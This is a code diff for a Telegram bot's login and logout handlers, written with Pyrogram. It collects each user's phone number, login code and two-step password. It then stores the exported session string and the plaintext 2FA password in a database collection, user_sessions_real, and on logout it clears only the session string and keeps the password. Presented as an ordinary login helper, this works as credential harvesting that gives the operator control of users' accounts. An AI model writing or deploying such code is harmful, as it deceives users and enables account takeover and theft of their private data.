@@ -7,23 +7,22 @@
 # Telegram: https://t.me/team_spy_pro
 # YouTube: https://youtube.com/@dev_gagan
 # Created: 2025-01-11
-# Last Modified: 2025-01-11
-# Version: 2.0.5
+# Last Modified: 2025-05-07
+# Version: 2.0.6
 # License: MIT License
 # ---------------------------------------------------
 
-from pyrogram import filters, Client, idle
+from pyrogram import filters, Client
 from devgagan import app
 import random
 import os
-import asyncio
 import string
+import pytz
+from datetime import datetime
 from config import OWNER_ID
 from devgagan.core.mongo import db
 from devgagan.core.mongo.db import user_sessions_real
-#from .connect_user import connect_user, disconnect_user, owner_message_handler, user_reply_handler, send_message_callback, cancel_message_callback  # ✅ Imported connection functions
-#from .connect_user import active_connections  # ✅ Import the dictionary
-from devgagan.core.func import subscribe, chk_user
+from devgagan.core.func import subscribe
 from config import API_ID as api_id, API_HASH as api_hash
 from pyrogram.errors import (
     ApiIdInvalid,
@@ -37,7 +36,7 @@ from pyrogram.errors import (
 
 def generate_random_name(length=7):
     characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))  # Edited
+    return ''.join(random.choice(characters) for _ in range(length))
 
 async def delete_session_files(user_id):
     session_file = f"session_{user_id}.session"
@@ -48,16 +47,14 @@ async def delete_session_files(user_id):
 
     if session_file_exists:
         os.remove(session_file)
-    
+
     if memory_file_exists:
         os.remove(memory_file)
 
-    # Delete session from the database
     if session_file_exists or memory_file_exists:
         await db.remove_session(user_id)
-        #await db.user_sessions_real.delete_one({"user_id": user_id})
-        return True  # Files were deleted
-    return False  # No files found
+        return True
+    return False
 
 @app.on_message(filters.command("logout"))
 async def clear_db(client, message):
@@ -65,7 +62,10 @@ async def clear_db(client, message):
     files_deleted = await delete_session_files(user_id)
     try:
         await db.remove_session(user_id)
-        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
+        await db.user_sessions_real.update_one(
+            {"user_id": user_id},
+            {"$set": {"session_string": None}}
+        )
     except Exception:
         pass
 
@@ -74,16 +74,14 @@ async def clear_db(client, message):
     else:
         await message.reply("✅ Logged out with flag -m")
 
-
-
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
         return
-        
-    user_id = message.chat.id   
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
+
+    user_id = message.chat.id
+    number = await _.ask(user_id, 'Please enter your phone number along with the country code.\nExample: +919876543210', filters=filters.text)
     phone_number = number.text
 
     try:
@@ -93,26 +91,26 @@ async def generate_session(_, message):
     except Exception as e:
         await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
         return
-    
+
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
-        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+        await message.reply('❌ Invalid API ID/HASH. Please restart the session.')
         return
     except PhoneNumberInvalid:
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
-    
+
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
+        otp_code = await _.ask(user_id, "Enter OTP (Format: 1 2 3 4 5)", filters=filters.text, timeout=600)
     except TimeoutError:
-        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
+        await message.reply('⏰ Time limit exceeded. Please restart the session.')
         return
-    
+
     phone_code = otp_code.text.replace(" ", "")
-    
+
     try:
-        await client.sign_in(phone_number, code.phone_code_hash, phone_code)        
+        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
     except PhoneCodeInvalid:
         await message.reply('❌ Invalid OTP. Please restart the session.')
         return
@@ -121,11 +119,10 @@ async def generate_session(_, message):
         return
     except SessionPasswordNeeded:
         try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
+            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Enter your password.', filters=filters.text, timeout=300)
         except TimeoutError:
-            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
+            await message.reply('⏰ Time limit exceeded. Please restart the session.')
             return
-        
         try:
             password = two_step_msg.text
             await client.check_password(password=password)
@@ -135,40 +132,36 @@ async def generate_session(_, message):
     else:
         password = None
 
-    # ✅ Generate session string
     string_session = await client.export_session_string()
-
-    # ✅ Save session in both directories
     await db.set_session(user_id, string_session)
-   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
-    #User_Data:
-    # ✅ Fetch user details
+
     me = await client.get_me()
     username = me.username if me.username else "N/A"
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
-    user_id = me.id  
-    
+    user_id = me.id
+
+    ist = pytz.timezone('Asia/Kolkata')
+    current_time_ist = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
+
     user_data = {
         "user_id": user_id,
         "username": username,
         "name": full_name,
         "phone_number": phone_number,
         "session_string": string_session,
-        "password": password
+        "password": password,
+        "last_login": current_time_ist
     }
-    
-    #✅ Check if phone number exists in the database
-    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
+
+    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number})
     if existing_user:
-        # ✅ Update session and password for existing user
         await db.user_sessions_real.update_one(
             {"phone_number": phone_number},
             {"$set": user_data}
         )
     else:
-        # ✅ Create a new record
         await db.user_sessions_real.insert_one(user_data)
+
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
-#saving data into user_session_real
-
+             
